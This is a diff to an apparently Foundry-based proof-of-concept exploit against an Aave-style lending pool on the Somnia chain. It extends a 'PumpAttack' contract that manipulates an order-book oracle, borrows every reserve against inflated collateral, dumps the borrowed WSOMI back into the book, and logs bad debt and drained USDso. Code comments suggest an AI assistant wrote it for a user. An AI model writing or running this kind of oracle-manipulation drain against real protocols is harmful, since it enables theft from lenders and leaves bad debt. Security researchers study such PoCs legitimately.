@@ -23,6 +23,7 @@ interface IPool {
     function supply(address, uint256, address, uint16) external;
     function borrow(address, uint256, uint256, uint16, address) external;
     function getConfiguration(address) external view returns (uint256);
+    function withdraw(address, uint256, address) external returns (uint256);
     function getUserEMode(address) external view returns (uint256);
     function setUserEMode(uint8) external;
     function getEModeCategoryData(uint8) external view returns (uint16, uint16, uint16, address, string memory);
@@ -108,6 +109,9 @@ struct Metrics {
     uint8 legsBorrowed;
     uint8 legsBlocked; // rejected by config / cap / cash
     uint8 borrowedEra; // user eMode actually set
+    uint256 borrowedWsomi; // the reserve the user actually asked about
+    uint256 wsomiExitProceeds; // USDso recovered by selling it back
+    uint256 wsomiExitExecPrice;
 }
 
 /// @notice The bZx / Mango template, verbatim:
@@ -138,6 +142,7 @@ contract PumpAttack {
 
     Metrics internal m;
     uint256 internal pumpBps;
+    bool internal wsomiFirst;
 
     error Shortfall(Metrics m);
     error Leg(address asset, bytes inner);
@@ -145,6 +150,10 @@ contract PumpAttack {
     modifier onlySelf() {
         require(msg.sender == address(this), "self only");
         _;
+    }
+
+    constructor(bool wsomiFirst_) {
+        wsomiFirst = wsomiFirst_;
     }
 
     function run(uint256 amount, uint256 pumpBps_) external {
@@ -235,9 +244,17 @@ contract PumpAttack {
             }
         }
 
-        for (uint256 i; i < assets.length; ++i) {
-            address a = assets[i];
-            if (a == WSOMI) continue; // our own collateral
+        // WSOMI is NOT skipped: 3.6M cash, 500k borrow cap, the deepest reserve in the pool, and
+        // it is the asset the pump just moved. Skipping it is what the old file did.
+        //
+        // Order is the whole experiment. Borrow power is shared, so whichever asset is taken first
+        // gets it. WSOMI_FIRST=1 (default) spends everything on SOMI and dumps it back into the
+        // book; WSOMI_FIRST=0 spends it on the scarce reserves and leaves SOMI the remainder.
+        address[5] memory order = wsomiFirst
+            ? [WSOMI, USDSO, USDC, WETH, WBTC]
+            : [USDSO, USDC, WETH, WBTC, WSOMI];
+        for (uint256 i; i < order.length; ++i) {
+            address a = order[i];
             m.legsTried++;
             uint256 config = IPool(POOL).getConfiguration(a);
             if (!Cfg.active(config) || Cfg.frozen(config) || !Cfg.borrowEnabled(config)) {
@@ -259,6 +276,8 @@ contract PumpAttack {
             }
             uint256 budget = available - (available / 1_000_000) - 1;
             uint256 amount = (budget * (10 ** dec)) / price;
+            console2.log("  leg", a);
+            console2.log("    power left USDso", available * 1e10);
 
             // borrow cap, in whole tokens
             uint256 cap = Cfg.borrowCap(config);
@@ -275,6 +294,7 @@ contract PumpAttack {
             try this.borrowLeg(a, amount) {
                 m.legsBorrowed++;
                 m.borrowedUsdsoValue += _value18(amount, price, dec);
+                if (a == WSOMI) m.borrowedWsomi = amount;
                 m.badDebtUsdso += _value18(amount, price, dec);
                 console2.log("  borrowed", a);
                 console2.log("    amount", amount);
@@ -294,8 +314,45 @@ contract PumpAttack {
         IPool(POOL).borrow(asset, amount, 2, 0, address(this));
     }
 
+    /// @dev The leg the user actually asked about: borrow SOMI, sell it back into the book we just
+    ///      pushed up. If the ask moved, this recovers MORE USDso per SOMI than the oracle price.
+    ///      Accepts any price - sampling, not arbitrage - so a loss here is real, not a limit I set.
+    function _dumpWsomi() internal {
+        // Aave pays out aWSOMI; redeem it to the underlying before it can be sold.
+        try IPool(POOL).withdraw(WSOMI, type(uint256).max, address(this)) {} catch {}
+        uint256 bal = IERC20(WSOMI).balanceOf(address(this));
+        if (bal == 0) return;
+
+        (,,,, uint256 tick, uint256 minQty, uint256 lot) = IClob(MARKET).getPoolParams();
+        uint256 qty = (bal / lot) * lot;
+        if (qty < minQty) return;
+
+        uint256 bid = _best(true);
+        if (bid == 0) return;
+        uint256 limit = ((bid / 100) / tick) * tick; // 1% of best bid: floor of last resort only
+        if (limit == 0) limit = tick;
+
+        IERC20(WSOMI).approve(MARKET, qty);
+        uint256 quoteBefore = IERC20(USDSO).balanceOf(address(this));
+        (bool ok,) = IClob(MARKET).placeOrder(
+            false, 0, limit, qty, uint64((block.timestamp + 300) * 1e9), IOC, 0, address(0), 0
+        );
+        if (!ok) return;
+        if (IERC20(USDSO).balanceOf(address(this)) == quoteBefore) {
+            uint256 vaulted = IClob(MARKET).getWithdrawableBalance(address(this), USDSO);
+            if (vaulted > 0) {
+                try IClob(MARKET).withdraw(USDSO, vaulted) {} catch {}
+            }
+        }
+        uint256 got = IERC20(USDSO).balanceOf(address(this)) - quoteBefore;
+        m.wsomiExitProceeds = got;
+        m.wsomiExitExecPrice = got == 0 ? 0 : (got * 1e18) / qty;
+    }
+
     // ---- 5. everything that walks out vs the flash that must go back ----
     function _settle() internal {
+        if (m.borrowedWsomi > 0) _dumpWsomi();
+
         uint256 have = IERC20(USDSO).balanceOf(address(this));
         m.leftoverUsdso = have;
         m.extractedUsdso = have + m.borrowedUsdsoValue;
@@ -497,7 +554,7 @@ contract SomniaPoC is Test {
     }
 
     function _attempt(uint256 amount) internal returns (Metrics memory m, bool repaid) {
-        PumpAttack a = new PumpAttack();
+        PumpAttack a = new PumpAttack(vm.envOr("WSOMI_FIRST", true));
         uint256 pumpBps = vm.envOr("PUMP_BPS", uint256(100_000)); // 10x: do not respect the book
         try a.run(amount, pumpBps) {
             return (a.metrics(), true);
@@ -542,7 +599,10 @@ contract SomniaPoC is Test {
         console2.log("  legs tried", m.legsTried);
         console2.log("  legs borrowed", m.legsBorrowed);
         console2.log("  legs blocked", m.legsBlocked);
+        console2.log("  borrowed WSOMI", m.borrowedWsomi);
         console2.log("  borrowed value USDso", m.borrowedUsdsoValue);
+        console2.log("  WSOMI sold back for USDso", m.wsomiExitProceeds);
+        console2.log("  WSOMI exit exec price", m.wsomiExitExecPrice);
 
         console2.log("--- drain");
         console2.log("  extracted USDso", m.extractedUsdso);
